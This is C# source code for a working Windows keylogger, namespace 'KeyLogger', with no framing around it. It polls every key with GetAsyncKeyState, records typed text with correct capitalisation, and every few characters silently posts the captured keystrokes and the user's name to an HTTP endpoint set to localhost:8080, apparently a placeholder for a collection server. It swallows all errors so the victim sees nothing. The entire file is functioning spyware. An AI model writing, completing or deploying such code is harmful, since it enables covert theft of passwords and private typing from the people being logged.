using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Http;
using System.Text;

namespace KeyLogger
{
    internal static class Program
    {
        private static string buf = "";
        private static readonly HttpClient client = new HttpClient();
        private static readonly string apiUrl = "http://localhost:8080/log?username=" + Environment.UserName;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [STAThread]
        static void Main(String[] args)
        {
            while (true)
            {
                Thread.Sleep(100);

                // An even more advanced check
                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                // Keys.ShiftKey doesn't work, so using its numeric equivalent
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        // Check for Space and Enter
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }

                        // Skip mouse buttons
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;

                        // Skip Shift, Ctrl, Alt, and other modifier keys
                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
                        if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;

                        // Skip other non-essential keys
                        if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
                        if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
                        if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
                        if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
                        if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;

                        // Handle single character keys
                        if (((Keys)i).ToString().Length == 1)
                        {
                            char key = ((Keys)i).ToString()[0];
                            if (char.IsLetter(key) && isBig)
                            {
                                buf += char.ToUpper(key);
                            }
                            else if (char.IsLetter(key) && !isBig)
                            {
                                buf += char.ToLower(key);
                            }
                            else
                            {
                                buf += key;
                            }
                        }
                        else
                        {
                            // Wrap non-single-character keys in angle brackets
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length > 10)
                        {
                            _ = SendPayload(buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        private static async Task SendPayload(string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                await client.PostAsync(apiUrl, content);
            }
            catch (Exception)
            {
                // Silently ignore errors
            }
        }
    }
}
